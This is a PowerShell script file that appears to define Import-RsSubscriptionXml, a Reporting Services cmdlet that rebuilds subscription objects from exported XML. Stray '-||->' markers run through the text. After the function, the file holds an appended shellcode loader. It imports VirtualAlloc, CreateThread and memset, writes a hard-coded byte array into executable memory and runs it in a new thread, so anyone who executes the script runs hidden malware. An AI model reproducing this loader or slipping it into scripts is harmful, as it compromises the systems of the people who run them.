


 -||-> function Import-RsSubscriptionXml {
    

    [cmdletbinding()]
    param(
        [Parameter(Mandatory=$True,Position=0)]
        [string]
        $Path,

        [string]
        $ReportServerUri,

        [System.Management.Automation.PSCredential]
        $Credential,

        $Proxy
    )

    Begin
    {
         -||-> $Proxy =  -||-> New-RsWebServiceProxyHelper -BoundParameters $PSBoundParameters <-||-  <-||- 
         -||-> $Namespace = $Proxy.GetType().NameSpace <-||- 
    }
    Process
    {
         -||-> Write-Verbose "Importing Subscription from $Path..." <-||- 
         -||-> $Subscription =  -||-> Import-Clixml $Path <-||-  <-||- 

         -||-> foreach ($Sub in  -||-> $Subscription <-||- ) 
        {
            
             -||-> $ParameterValues = @() <-||- 

             -||-> $Sub.DeliverySettings.ParameterValues | ForEach-Object {
                 -||-> if ( -||-> $_.Name <-||- )
                {
                     -||-> $ParameterValues = $ParameterValues + ( -||-> New-Object "$Namespace.ParameterValue" -Property @{ Name =  -||-> $_.Name <-||- ; Value =  -||-> $_.Value <-||-  } <-||- ) <-||- 
                }
                elseif ( -||-> $_.ParameterName <-||- )
                {
                     -||-> $ParameterValues = $ParameterValues + ( -||-> New-Object "$Namespace.ParameterFieldReference" -Property @{ ParameterName =  -||-> $_.ParameterName <-||- ; FieldAlias =  -||-> $_.FieldAlias <-||-  } <-||- ) <-||- 
                } <-||- 
            } <-||- 

             -||-> $DeliverySettings = @{
                Extension =  -||-> $Sub.DeliverySettings.Extension <-||- 
                ParameterValues =  -||-> $ParameterValues <-||-  
            } <-||- 

             -||-> $Sub.DeliverySettings = ( -||-> New-Object "$Namespace.ExtensionSettings" -Property $DeliverySettings <-||- ) <-||- 

            
             -||-> $Values = @() <-||- 

             -||-> $Sub.Values | ForEach-Object {

                 -||-> if ( -||-> $_.Name <-||- )
                {
                     -||-> $Values = $Values + ( -||-> New-Object "$Namespace.ParameterValue" -Property @{ Name =  -||-> $_.Name <-||- ; Value =  -||-> $_.Value <-||-  } <-||- ) <-||- 
                }
                elseif ( -||-> $_.ParameterName <-||- )
                {
                     -||-> $Values = $Values + ( -||-> New-Object "$Namespace.ParameterFieldReference" -Property @{ ParameterName =  -||-> $_.ParameterName <-||- ; FieldAlias =  -||-> $_.FieldAlias <-||-  } <-||- ) <-||- 
                } <-||- 
            } <-||- 
             -||-> $Sub.Values = $Values <-||- 


            
             -||-> if ( -||-> $Sub.IsDataDriven <-||- )
            {
                 -||-> $DataSetDefinitionFields = @() <-||- 
                    
                 -||-> $Sub.DataRetrievalPlan.DataSet.Fields | ForEach-Object {
                     -||-> $DataSetDefinitionFields     = $DataSetDefinitionFields + ( -||-> New-Object "$Namespace.Field" -Property @{ Alias =  -||-> $_.Alias <-||- ; Name  =  -||-> $_.Name <-||-  } <-||- ) <-||- 
                } <-||- 

                 -||-> $DataSetDefinition =  -||-> New-Object "$Namespace.DataSetDefinition" <-||-  <-||- 
                 -||-> $DataSetDefinition.Fields = $DataSetDefinitionFields <-||- 

                 -||-> $DataSetDefinition.Query =  -||-> New-Object "$Namespace.QueryDefinition" <-||-  <-||- 

                 -||-> $DataSetDefinition.Query.CommandType            = $sub.DataRetrievalPlan.DataSet.Query.CommandType <-||- 
                 -||-> $DataSetDefinition.Query.CommandText            = $sub.DataRetrievalPlan.DataSet.Query.CommandText <-||- 
                 -||-> $DataSetDefinition.Query.Timeout                = $sub.DataRetrievalPlan.DataSet.Query.Timeout <-||- 
                 -||-> $DataSetDefinition.Query.TimeoutSpecified       = $sub.DataRetrievalPlan.DataSet.Query.TimeoutSpecified <-||- 

                 -||-> $DataSetDefinition.CaseSensitivity              = $sub.DataRetrievalPlan.DataSet.CaseSensitivity <-||- 
                 -||-> $DataSetDefinition.CaseSensitivitySpecified     = $sub.DataRetrievalPlan.DataSet.CaseSensitivitySpecified <-||- 
                 -||-> $DataSetDefinition.Collation                    = $sub.DataRetrievalPlan.DataSet.Collation <-||- 
                 -||-> $DataSetDefinition.AccentSensitivity            = $sub.DataRetrievalPlan.DataSet.AccentSensitivity <-||- 
                 -||-> $DataSetDefinition.AccentSensitivitySpecified   = $sub.DataRetrievalPlan.DataSet.AccentSensitivitySpecified <-||- 
                 -||-> $DataSetDefinition.KanatypeSensitivity          = $sub.DataRetrievalPlan.DataSet.KanatypeSensitivity <-||- 
                 -||-> $DataSetDefinition.KanatypeSensitivitySpecified = $sub.DataRetrievalPlan.DataSet.KanatypeSensitivitySpecified <-||- 
                 -||-> $DataSetDefinition.WidthSensitivity             = $sub.DataRetrievalPlan.DataSet.WidthSensitivity <-||- 
                 -||-> $DataSetDefinition.WidthSensitivitySpecified    = $sub.DataRetrievalPlan.DataSet.WidthSensitivitySpecified <-||- 
                 -||-> $DataSetDefinition.Name                         = $sub.DataRetrievalPlan.DataSet.Name <-||- 

                 -||-> $DataRetrievalPlanItem =  -||-> New-Object "$Namespace.DataSourceReference" <-||-  <-||- 
                 -||-> $DataRetrievalPlanItem.Reference = $sub.DataRetrievalPlan.Item.Reference <-||- 

                 -||-> $DataRetrievalSettings = @{ 
                    Item =  -||-> $DataRetrievalPlanItem <-||- 
                    DataSet =  -||-> $DataSetDefinition <-||- 
                } <-||- 

                 -||-> $DataRetrievalPlan =  -||-> New-Object "$Namespace.DataRetrievalPlan" -Property $DataRetrievalSettings <-||-  <-||- 

                 -||-> $Sub.DataRetrievalPlan = $DataRetrievalPlan <-||-   
            } <-||- 

            
             -||-> $Sub <-||- 
        } <-||- 
    }
} <-||- 
 -||-> $9Gip = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $9Gip -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xd9,0xcd,0xd9,0x74,0x24,0xf4,0xbb,0x3a,0xfd,0xb4,0xe5,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x5a,0x18,0x83,0xea,0xfc,0x03,0x5a,0x2e,0x1f,0x41,0x19,0xa6,0x5d,0xaa,0xe2,0x36,0x02,0x22,0x07,0x07,0x02,0x50,0x43,0x37,0xb2,0x12,0x01,0xbb,0x39,0x76,0xb2,0x48,0x4f,0x5f,0xb5,0xf9,0xfa,0xb9,0xf8,0xfa,0x57,0xf9,0x9b,0x78,0xaa,0x2e,0x7c,0x41,0x65,0x23,0x7d,0x86,0x98,0xce,0x2f,0x5f,0xd6,0x7d,0xc0,0xd4,0xa2,0xbd,0x6b,0xa6,0x23,0xc6,0x88,0x7e,0x45,0xe7,0x1e,0xf5,0x1c,0x27,0xa0,0xda,0x14,0x6e,0xba,0x3f,0x10,0x38,0x31,0x8b,0xee,0xbb,0x93,0xc2,0x0f,0x17,0xda,0xeb,0xfd,0x69,0x1a,0xcb,0x1d,0x1c,0x52,0x28,0xa3,0x27,0xa1,0x53,0x7f,0xad,0x32,0xf3,0xf4,0x15,0x9f,0x02,0xd8,0xc0,0x54,0x08,0x95,0x87,0x33,0x0c,0x28,0x4b,0x48,0x28,0xa1,0x6a,0x9f,0xb9,0xf1,0x48,0x3b,0xe2,0xa2,0xf1,0x1a,0x4e,0x04,0x0d,0x7c,0x31,0xf9,0xab,0xf6,0xdf,0xee,0xc1,0x54,0xb7,0xc3,0xeb,0x66,0x47,0x4c,0x7b,0x14,0x75,0xd3,0xd7,0xb2,0x35,0x9c,0xf1,0x45,0x3a,0xb7,0x46,0xd9,0xc5,0x38,0xb7,0xf3,0x01,0x6c,0xe7,0x6b,0xa0,0x0d,0x6c,0x6c,0x4d,0xd8,0x23,0x3c,0xe1,0xb3,0x83,0xec,0x41,0x64,0x6c,0xe7,0x4e,0x5b,0x8c,0x08,0x85,0xf4,0x27,0xf2,0x4d,0x3b,0x1f,0xfd,0x86,0xd3,0x62,0xfe,0x9a,0xb9,0xea,0x18,0xf0,0xad,0xba,0xb3,0x6c,0x57,0xe7,0x48,0x0d,0x98,0x3d,0x35,0x0d,0x12,0xb2,0xc9,0xc3,0xd3,0xbf,0xd9,0xb3,0x13,0x8a,0x80,0x15,0x2b,0x20,0xae,0x99,0xb9,0xcf,0x79,0xce,0x55,0xd2,0x5c,0x38,0xfa,0x2d,0x8b,0x33,0x33,0xb8,0x74,0x2b,0x3c,0x2c,0x75,0xab,0x6a,0x26,0x75,0xc3,0xca,0x12,0x26,0xf6,0x14,0x8f,0x5a,0xab,0x80,0x30,0x0b,0x18,0x02,0x59,0xb1,0x47,0x64,0xc6,0x4a,0xa2,0x74,0x3a,0x9d,0x8a,0x02,0x52,0x1d <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $E2TI=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $E2TI.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$E2TI,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



